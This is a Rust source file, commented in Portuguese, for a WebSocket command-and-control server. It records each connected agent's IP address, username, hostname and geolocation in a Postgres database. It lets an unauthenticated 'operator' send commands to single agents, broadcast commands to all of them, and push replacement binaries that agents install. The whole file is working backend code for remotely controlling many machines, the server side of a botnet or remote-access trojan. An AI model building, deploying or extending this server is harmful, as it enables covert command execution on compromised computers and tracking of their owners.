use crate::handlers::models::{Agent, C2Message};
use futures::{SinkExt, StreamExt};
use sqlx::{Pool, Postgres, Row};
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::sync::mpsc;
use tokio::time;
use uuid::Uuid;
use warp::Filter;
use warp::ws::{Message, WebSocket};

pub struct ServerState {
    pub agents: HashMap<String, mpsc::Sender<Message>>, // Agentes registrados
    pub clients: HashMap<String, mpsc::Sender<Message>>, // Todas as conexões (agentes e operadores)
    pub db: Pool<Postgres>,
}

impl ServerState {
    pub fn new(db: Pool<Postgres>) -> Self {
        ServerState {
            agents: HashMap::new(),
            clients: HashMap::new(),
            db,
        }
    }
}

pub async fn start_server(db: Pool<Postgres>) {
    let state = Arc::new(Mutex::new(ServerState::new(db)));
    let state_filter = warp::any().map(move || state.clone());

    let ws_route =
        warp::path("c2")
            .and(warp::ws())
            .and(state_filter)
            .map(|ws: warp::ws::Ws, state| {
                ws.on_upgrade(move |socket| handle_connection(socket, state))
            });

    println!("Server running on ws://0.0.0.0:80/c2");

    warp::serve(ws_route).run(([0, 0, 0, 0], 80)).await;
}

async fn update_agent_status(
    state: &Arc<Mutex<ServerState>>,
    uuid: &str,
    online: bool,
) -> Result<(), sqlx::Error> {
    let db = state.lock().unwrap().db.clone();
    sqlx::query("UPDATE agents SET online = $1 WHERE uuid = $2")
        .bind(online)
        .bind(uuid)
        .execute(&db)
        .await?;
    Ok(())
}

async fn broadcast_update(state: &Arc<Mutex<ServerState>>, version: String, binary: Vec<u8>) {
    let update_msg = serde_json::to_string(&C2Message::UpdateSoftwareWithBinary {
        version: version.clone(),
        binary: binary.clone(),
    })
    .unwrap();
    let senders = {
        let state = state.lock().unwrap();
        eprintln!("Broadcasting update to {} agents", state.agents.len());
        state.agents.values().cloned().collect::<Vec<_>>()
    };
    for sender in senders {
        if let Err(e) = sender.send(Message::text(update_msg.clone())).await {
            eprintln!("Failed to send update to agent: {}", e);
        }
    }
    eprintln!(
        "Broadcasted software update to all agents for version {}",
        version
    );
}

async fn check_and_update_agent(
    state: &Arc<Mutex<ServerState>>,
    uuid: &str,
    agent_version: &str,
    tx: &mpsc::Sender<Message>,
) {
    let db = {
        let state = state.lock().unwrap();
        state.db.clone()
    };
    let version_record = sqlx::query(
        "SELECT version, \"binary\" FROM agent_version ORDER BY updated_at DESC LIMIT 1",
    )
    .fetch_optional(&db)
    .await;
    match version_record {
        Ok(Some(record)) => {
            let server_version: String = record.get("version");
            let binary: Vec<u8> = record.get("binary");
            if server_version != agent_version {
                // Enviar atualização para o agente específico
                let update_msg = serde_json::to_string(&C2Message::UpdateSoftwareWithBinary {
                    version: server_version.clone(),
                    binary: binary.clone(),
                })
                .unwrap();
                let _ = tx.send(Message::text(update_msg)).await;
                eprintln!(
                    "Sent update to agent {} for version {}",
                    uuid, server_version
                );

                // Broadcast para todos os outros agentes
                broadcast_update(state, server_version, binary).await;
            }
        }
        Ok(None) => {
            eprintln!("No version found in agent_version table");
        }
        Err(e) => {
            eprintln!("Error fetching version from database: {}", e);
        }
    }
}

async fn handle_ws_message(
    state: &Arc<Mutex<ServerState>>,
    uuid: &str,
    c2_msg: C2Message,
    tx: &mpsc::Sender<Message>,
) {
    match c2_msg {
        C2Message::Pong => {
            if uuid != "operator" {
                if let Err(e) = update_agent_status(state, uuid, true).await {
                    eprintln!("Error updating agent status for {}: {}", uuid, e);
                }
            }
            let response = serde_json::to_string(&C2Message::AgentStatus {
                uuid: uuid.to_string(),
                online: true,
            })
            .unwrap();
            let senders = {
                let state = state.lock().unwrap();
                state.clients.values().cloned().collect::<Vec<_>>()
            };
            for sender in senders {
                let _ = sender.send(Message::text(response.clone())).await;
            }
        }
        C2Message::AgentRegister {
            uuid,
            ip,
            username,
            hostname,
            country,
            city,
            region,
            latitude,
            longitude,
            version,
        } => {
            if Uuid::parse_str(&uuid).is_err() {
                eprintln!("Invalid UUID format for agent registration: {}", uuid);
                return;
            }

            eprintln!("Registering agent {}", uuid);
            let db = {
                let state = state.lock().unwrap();
                state.db.clone()
            };
            let result = sqlx::query(
                "INSERT INTO agents (uuid, ip, username, hostname, country, city, region, latitude, longitude, version, online) 
                    VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, true) 
                    ON CONFLICT (uuid) DO UPDATE SET
                    ip = EXCLUDED.ip,
                    username = EXCLUDED.username,
                    hostname = EXCLUDED.hostname,
                    country = EXCLUDED.country,
                    city = EXCLUDED.city,
                    region = EXCLUDED.region,
                    latitude = EXCLUDED.latitude,
                    longitude = EXCLUDED.longitude,
                    version = EXCLUDED.version,
                    online = true",
            )
            .bind(&uuid)
            .bind(&ip)
            .bind(&username)
            .bind(&hostname)
            .bind(&country)
            .bind(&city)
            .bind(region)
            .bind(latitude)
            .bind(longitude)
            .bind(&version)
            .execute(&db)
            .await;

            if let Err(e) = result {
                eprintln!("Error registering agent {} in database: {}", uuid, e);
                let mut state = state.lock().unwrap();
                state.agents.remove(&uuid);
                state.clients.remove(&uuid);
            } else {
                eprintln!("Agent {} registered successfully", uuid);
            }
        }
        C2Message::RequestAgentList => {
            let db = {
                let state = state.lock().unwrap();
                state.db.clone()
            };
            let agents = sqlx::query_as::<_, Agent>("SELECT * FROM agents")
                .fetch_all(&db)
                .await
                .unwrap_or_default();
            let response = serde_json::to_string(&C2Message::AgentList {
                agents: agents.clone(),
                total: agents.len(),
                online: agents.iter().filter(|agent| agent.online).count(),
            })
            .map_err(|e| format!("Failed to serialize response: {}", e))
            .expect("Failed to serialize response");
            let _ = tx.send(Message::text(response)).await;
        }
        C2Message::RequestAgentDetails { identifier } => {
            let db = {
                let state = state.lock().unwrap();
                state.db.clone()
            };
            let agent = if let Ok(id) = identifier.parse::<i32>() {
                sqlx::query_as::<_, Agent>("SELECT * FROM agents WHERE id = $1")
                    .bind(id)
                    .fetch_optional(&db)
                    .await
                    .unwrap_or(None)
            } else {
                sqlx::query_as::<_, Agent>("SELECT * FROM agents WHERE uuid = $1")
                    .bind(&identifier)
                    .fetch_optional(&db)
                    .await
                    .unwrap_or(None)
            };
            let response = serde_json::to_string(&C2Message::AgentDetails { agent }).unwrap();
            let _ = tx.send(Message::text(response)).await;
        }
        C2Message::Command { uuid, cmd } => {
            let agent_sender = {
                let state = state.lock().unwrap();
                state.agents.get(&uuid).cloned()
            };
            if let Some(agent_sender) = agent_sender {
                let command_msg = serde_json::to_string(&C2Message::Command { uuid, cmd }).unwrap();
                let _ = agent_sender.send(Message::text(command_msg)).await;
            } else {
                eprintln!("Agent {} not found for command", uuid);
            }
        }
        C2Message::Broadcast { cmd } => {
            let senders = {
                let state = state.lock().unwrap();
                eprintln!("Broadcasting to {} agents", state.agents.len());
                state.agents.values().cloned().collect::<Vec<_>>()
            };
            let broadcast_msg = serde_json::to_string(&C2Message::Broadcast { cmd }).unwrap();
            for sender in senders {
                if let Err(e) = sender.send(Message::text(broadcast_msg.clone())).await {
                    eprintln!("Failed to send broadcast to agent: {}", e);
                }
            }
        }
        C2Message::CommandResponse { output } => {
            let senders = {
                let state = state.lock().unwrap();
                state.clients.values().cloned().collect::<Vec<_>>()
            };
            let response_msg =
                serde_json::to_string(&C2Message::CommandResponse { output }).unwrap();
            for sender in senders {
                let _ = sender.send(Message::text(response_msg.clone())).await;
            }
        }
        C2Message::AgentSoftwareUpdateWithBinary { version, binary } => {
            let db = {
                let state = state.lock().unwrap();
                state.db.clone()
            };
            let result = sqlx::query(
                "INSERT INTO agent_version (version, \"binary\") 
                    VALUES ($1, $2)
                    ON CONFLICT (id) DO UPDATE SET
                    version = EXCLUDED.version,
                    \"binary\" = EXCLUDED.\"binary\",
                    updated_at = CURRENT_TIMESTAMP",
            )
            .bind(&version)
            .bind(&binary)
            .execute(&db)
            .await;
            if let Err(e) = result {
                eprintln!("Error updating agent version: {}", e);
            } else {
                eprintln!("Updated agent version to {}", version);
                // Broadcast para todos os agentes
                broadcast_update(state, version, binary).await;
            }
        }
        C2Message::VersionCheck {
            uuid,
            agent_version,
        } => {
            let db = {
                let state = state.lock().unwrap();
                state.db.clone()
            };

            // Buscar a versão mais recente do servidor
            if let Ok(Some(record)) =
                sqlx::query("SELECT version FROM agent_version ORDER BY updated_at DESC LIMIT 1")
                    .fetch_optional(&db)
                    .await
            {
                let server_version: String = record.get("version");

                // Enviar a resposta de versão para o agente
                let version_response = serde_json::to_string(&C2Message::VersionResponse {
                    version: server_version.clone(),
                })
                .unwrap();
                if let Err(e) = tx.send(Message::text(version_response)).await {
                    eprintln!("Failed to send VersionResponse to agent {}: {}", uuid, e);
                } else {
                    eprintln!(
                        "Successfully sent VersionResponse to agent {}: version={}",
                        uuid, server_version
                    );
                }

                // Se a versão do agente for diferente, iniciar o processo de atualização
                if agent_version != server_version {
                    check_and_update_agent(state, &uuid, &agent_version, tx).await;
                }
            } else {
                eprintln!("No version found in agent_version table for agent {}", uuid);
                // Enviar versão padrão se não houver versão no banco
                let version_response = serde_json::to_string(&C2Message::VersionResponse {
                    version: "1.0.0".to_string(),
                })
                .unwrap();
                if let Err(e) = tx.send(Message::text(version_response)).await {
                    eprintln!(
                        "Failed to send default VersionResponse to agent {}: {}",
                        uuid, e
                    );
                } else {
                    eprintln!(
                        "Successfully sent default VersionResponse to agent {}: version=1.0.0",
                        uuid
                    );
                }
            }
        }
        C2Message::VersionCheckAck {} => {
            eprintln!("Received VersionCheckAck from client {}", uuid);
            // Não remover o cliente, apenas registrar o ack
        }
        _ => {}
    }
}

async fn handle_connection(ws: WebSocket, state: Arc<Mutex<ServerState>>) {
    let (mut ws_sender, mut ws_receiver) = ws.split();
    let (tx, mut rx) = mpsc::channel::<Message>(100);

    {
        let mut state = state.lock().unwrap();
        state.clients.insert("pending".to_string(), tx.clone());
        eprintln!("New client connected: pending");
    }

    // Iniciar o send_task imediatamente para garantir que mensagens sejam enviadas
    let state_clone = state.clone();
    let mut agent_uuid = "pending".to_string();
    let agent_uuid_for_task = agent_uuid.clone();
    let send_task = tokio::spawn(async move {
        while let Some(msg) = rx.recv().await {
            match ws_sender.send(msg).await {
                Ok(()) => (),
                Err(e) => {
                    eprintln!(
                        "send_task for client {}: error sending message via WebSocket: {}",
                        agent_uuid_for_task, e
                    );
                    if e.to_string().contains("Broken pipe") {
                        eprintln!(
                            "Detected broken pipe or connection closed for client {}",
                            agent_uuid_for_task
                        );
                        if agent_uuid_for_task != "operator" {
                            if let Err(e) =
                                update_agent_status(&state_clone, &agent_uuid_for_task, false).await
                            {
                                eprintln!(
                                    "Error updating agent status for {} to offline: {}",
                                    agent_uuid_for_task, e
                                );
                            } else {
                                eprintln!(
                                    "Agent {} status updated to offline in database.",
                                    agent_uuid_for_task
                                );
                            }
                        }
                        let mut state = state_clone.lock().unwrap();
                        state.clients.remove(&agent_uuid_for_task);
                        if agent_uuid_for_task != "operator" {
                            state.agents.remove(&agent_uuid_for_task);
                        }
                    }
                    return Err(e.to_string());
                }
            }
        }
        if let Err(e) = ws_sender.close().await {
            eprintln!(
                "Error closing WebSocket for client {}: {}",
                agent_uuid_for_task, e
            );
        }
        eprintln!(
            "send_task for client {}: channel closed, task ending",
            agent_uuid_for_task
        );
        Ok::<(), String>(())
    });

    // Processar mensagens iniciais
    while let Some(Ok(msg)) = ws_receiver.next().await {
        if let Ok(text) = msg.to_str() {
            if let Ok(c2_msg) = serde_json::from_str::<C2Message>(text) {
                match c2_msg.clone() {
                    C2Message::AgentRegister {
                        uuid,
                        ip,
                        username,
                        hostname,
                        country,
                        city,
                        region,
                        latitude,
                        longitude,
                        version,
                    } => {
                        agent_uuid = uuid;
                        {
                            let mut state = state.lock().unwrap();
                            state.clients.remove("pending");
                            state.clients.insert(agent_uuid.clone(), tx.clone());
                            // Já foi adicionado ao state.agents no VersionCheck, apenas logamos
                            eprintln!(
                                "Agent {} already in state.agents, processing registration",
                                agent_uuid
                            );
                        }
                        if let Err(e) = update_agent_status(&state, &agent_uuid, true).await {
                            eprintln!(
                                "Error updating agent status for {} to online: {}",
                                agent_uuid, e
                            );
                        } else {
                            eprintln!("Agent {} status updated to online in database.", agent_uuid);
                        }
                        handle_ws_message(&state, &agent_uuid, c2_msg, &tx).await;
                    }
                    C2Message::VersionCheck { uuid, .. } => {
                        agent_uuid = uuid;
                        {
                            let mut state = state.lock().unwrap();
                            state.clients.remove("pending");
                            state.clients.insert(agent_uuid.clone(), tx.clone());
                            state.agents.insert(agent_uuid.clone(), tx.clone()); // Adicionar ao state.agents aqui
                            eprintln!(
                                "Received VersionCheck from agent {}, added to state.agents",
                                agent_uuid
                            );
                        }
                        if let Err(e) = update_agent_status(&state, &agent_uuid, true).await {
                            eprintln!(
                                "Error updating agent status for {} to online: {}",
                                agent_uuid, e
                            );
                        } else {
                            eprintln!("Agent {} status updated to online in database.", agent_uuid);
                        }
                        handle_ws_message(&state, &agent_uuid, c2_msg, &tx).await;
                        break; // Sai do loop inicial para permitir que o send_task envie a resposta
                    }
                    _ => {
                        agent_uuid = "operator".to_string();
                        {
                            let mut state = state.lock().unwrap();
                            state.clients.remove("pending");
                            state.clients.insert(agent_uuid.clone(), tx.clone());
                        }
                        handle_ws_message(&state, &agent_uuid, c2_msg, &tx).await;
                        break; // Operador só precisa de uma mensagem inicial
                    }
                }
            }
        }
    }

    if agent_uuid == "pending" {
        eprintln!("Connection closed before receiving initial message");
        {
            let mut state = state.lock().unwrap();
            state.clients.remove("pending");
        }
        let _ = tx.send(Message::close()).await; // Encerra o canal para o send_task
        let _ = send_task.await;
        return;
    }

    let state_clone = state.clone();
    let tx_clone = tx.clone();
    let agent_uuid_clone = agent_uuid.clone();
    let heartbeat_task = tokio::spawn(async move {
        let mut interval = time::interval(Duration::from_secs(30));
        loop {
            interval.tick().await;
            let ping = match serde_json::to_string(&C2Message::Ping) {
                Ok(ping) => ping,
                Err(e) => {
                    eprintln!("Serialization error for ping: {}", e);
                    break;
                }
            };
            if tx_clone.send(Message::text(ping)).await.is_err() {
                eprintln!(
                    "Failed to send ping to client {}. Assuming disconnection.",
                    agent_uuid_clone
                );
                break;
            }
        }
        Ok::<(), String>(())
    });

    while let Some(result) = ws_receiver.next().await {
        match result {
            Ok(msg) => {
                if let Ok(text) = msg.to_str() {
                    if let Ok(c2_msg) = serde_json::from_str::<C2Message>(text) {
                        handle_ws_message(&state, &agent_uuid, c2_msg.clone(), &tx).await;
                    }
                }
            }
            Err(e) => {
                eprintln!("Error receiving message for client {}: {}", agent_uuid, e);
                if e.to_string().contains("Broken pipe")
                    || e.to_string().contains("Connection reset")
                {
                    eprintln!(
                        "Detected connection issue or closed for client {}",
                        agent_uuid
                    );
                    break;
                }
            }
        }
    }

    {
        let mut state = state.lock().unwrap();
        state.clients.remove(&agent_uuid);
        if agent_uuid != "operator" {
            state.agents.remove(&agent_uuid);
            eprintln!(
                "Agent {} disconnected and removed from active agents.",
                agent_uuid
            );
        }
        eprintln!(
            "Client {} disconnected and removed from active clients.",
            agent_uuid
        );
    }

    if agent_uuid != "operator" {
        if let Err(e) = update_agent_status(&state, &agent_uuid, false).await {
            eprintln!(
                "Error updating agent status for {} to offline: {}",
                agent_uuid, e
            );
        } else {
            eprintln!(
                "Agent {} status updated to offline in database.",
                agent_uuid
            );
        }
    }

    let response = serde_json::to_string(&C2Message::AgentStatus {
        uuid: agent_uuid.clone(),
        online: false,
    })
    .map_err(|e| format!("Serialization error: {}", e))
    .unwrap();
    let senders = {
        let state = state.lock().unwrap();
        state.clients.values().cloned().collect::<Vec<_>>()
    };
    for sender in senders {
        if let Err(e) = sender.send(Message::text(response.clone())).await {
            eprintln!(
                "Error notifying clients of status change for {}: {}",
                agent_uuid, e
            );
        }
    }

    let _ = tx.send(Message::close()).await; // Encerra o canal para o send_task
    let _ = send_task.await;
    let _ = heartbeat_task.await;
}
